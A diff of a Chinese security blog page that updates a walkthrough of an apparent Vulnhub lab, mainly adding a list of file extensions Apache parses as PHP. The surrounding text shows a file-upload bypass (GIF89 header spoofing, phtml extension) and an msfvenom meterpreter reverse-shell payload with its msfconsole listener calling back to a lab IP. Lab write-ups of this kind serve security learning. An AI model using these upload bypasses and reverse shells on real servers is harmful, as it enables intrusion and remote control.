@@ -49,7 +49,7 @@
         content="2021-12-29">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-29">
+        content="2022-02-08">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -412,7 +412,7 @@
 </ul>
 <p>（c）在木马文件 <strong>.php</strong>头部加上jpg格式的<strong>GIF89</strong>进行欺骗-上传成功-但上传的文件仍是以 <strong>.jpg</strong>为后缀，无法执行其中的php代码，此处也找不到可以<strong>FileInclusion</strong>的地方。<br>（d）<code>copy /b a.jpg+shell.php shell.jpg</code>将木马写入图片末端-上传成功-但上传的文件仍是以 <strong>.jpg</strong>为后缀，无法执行其中的php代码，此处也找不到可以<strong>FileInclusion</strong>的地方。  </p>
 </blockquote>
-<p>看了网上其他人的思路，发现自己刻板局限地认为上传文件的白名单只有前端提示的jpg、png和gif。其实只要将木马文件后缀改为<strong>phtml</strong>也能够上传成功并成功解析php代码。<br>这里使用<strong>msfvenom</strong>生成反弹shell代码文件<strong>msfshell.php</strong>：<br><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.228.128 lport=443 -o msfshell.php</code><br>文件生成后把代码&lt;?php前多余的部分删掉，把文件后缀改为 <strong>.phtml</strong>，成功上传文件。查看上传成功的响应报文能获得服务器的文件上传路径 <strong>/upload/&lt;木马文件&gt;</strong><br>使用<strong>msfconsole</strong>进行监听：<br><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler  
+<p>以如下方式结尾的文件会被apache当做php解析：<code>php、php3、php4、php5、php7、pht、phtml</code><br>看了网上其他人的思路，发现自己刻板局限地认为上传文件的白名单只有前端提示的jpg、png和gif。其实只要将木马文件后缀改为<strong>phtml</strong>也能够上传成功并成功解析php代码。<br>这里使用<strong>msfvenom</strong>生成反弹shell代码文件<strong>msfshell.php</strong>：<br><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.228.128 lport=443 -o msfshell.php</code><br>文件生成后把代码&lt;?php前多余的部分删掉，把文件后缀改为 <strong>.phtml</strong>，成功上传文件。查看上传成功的响应报文能获得服务器的文件上传路径 <strong>/upload/&lt;木马文件&gt;</strong><br>使用<strong>msfconsole</strong>进行监听：<br><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler  
 set payload php&#x2F;meterpreter&#x2F;reverse_tcp  
 set lhost 192.168.228.128 &#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lhost  
 set lport 443 &#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lport  
@@ -525,19 +525,19 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>25</span>
+    <span>29</span>
     <span>Posts</span>
   </a>
   <a 
     class="author-categories-count" 
     href="/categories">
-    <span>3</span>
+    <span>4</span>
     <span>Categories</span>
   </a>
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>26</span>
+    <span>30</span>
     <span>Tags</span>
   </a>
 </div>
@@ -588,7 +588,7 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">21</span>
+          <span class="categories-list-item-badge">24</span>
         </div>
       </a>
     
@@ -603,6 +603,13 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
         <div class="categories-list-item">
           等保测评-初级考试
           <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
         </div>
       </a>
     
@@ -675,6 +682,30 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
       </a>
     
       <a 
+        href="/tags/Httpd/" 
+        title="Httpd">
+        <div class="tags-list-item">Httpd</div>
+      </a>
+    
+      <a 
+        href="/tags/Linux/" 
+        title="Linux">
+        <div class="tags-list-item">Linux</div>
+      </a>
+    
+      <a 
+        href="/tags/Fastjson/" 
+        title="Fastjson">
+        <div class="tags-list-item">Fastjson</div>
+      </a>
+    
+      <a 
+        href="/tags/Shiro/" 
+        title="Shiro">
+        <div class="tags-list-item">Shiro</div>
+      </a>
+    
+      <a 
         href="/tags/Nginx/" 
         title="Nginx">
         <div class="tags-list-item">Nginx</div>
@@ -690,30 +721,6 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
         href="/tags/Tomcat/" 
         title="Tomcat">
         <div class="tags-list-item">Tomcat</div>
-      </a>
-    
-      <a 
-        href="/tags/FileUpload/" 
-        title="FileUpload">
-        <div class="tags-list-item">FileUpload</div>
-      </a>
-    
-      <a 
-        href="/tags/%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" 
-        title="劫持环境变量提权">
-        <div class="tags-list-item">劫持环境变量提权</div>
-      </a>
-    
-      <a 
-        href="/tags/ftp/" 
-        title="ftp">
-        <div class="tags-list-item">ftp</div>
-      </a>
-    
-      <a 
-        href="/tags/smb/" 
-        title="smb">
-        <div class="tags-list-item">smb</div>
       </a>
     
   </div>
@@ -749,23 +756,23 @@ run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-31</div>
-        <a href="/5821439b.html"><div class="recent-posts-item-content">Vulhub|Nginx集合</div></a>
+        <div class="recent-posts-item-title">2022-01-19</div>
+        <a href="/32c50423.html"><div class="recent-posts-item-content">Vulhub|HTTPD集合</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-30</div>
-        <a href="/338e3c98.html"><div class="recent-posts-item-content">Vulhub|Flink集合</div></a>
+        <div class="recent-posts-item-title">2022-01-19</div>
+        <a href="/88fdf392.html"><div class="recent-posts-item-content">Linux|命令集合</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-30</div>
-        <a href="/386f84ef.html"><div class="recent-posts-item-content">Vulhub|Tomcat集合</div></a>
+        <div class="recent-posts-item-title">2022-01-18</div>
+        <a href="/32c50423.html"><div class="recent-posts-item-content">Vulhub|Fastjson集合</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-29</div>
-        <a href="/480ec251.html"><div class="recent-posts-item-content">Vulnhub|DarkHole1</div></a>
+        <div class="recent-posts-item-title">2022-01-17</div>
+        <a href="/7d27907c.html"><div class="recent-posts-item-content">Vulhub|Shiro集合</div></a>
       </div>
     
   </div>
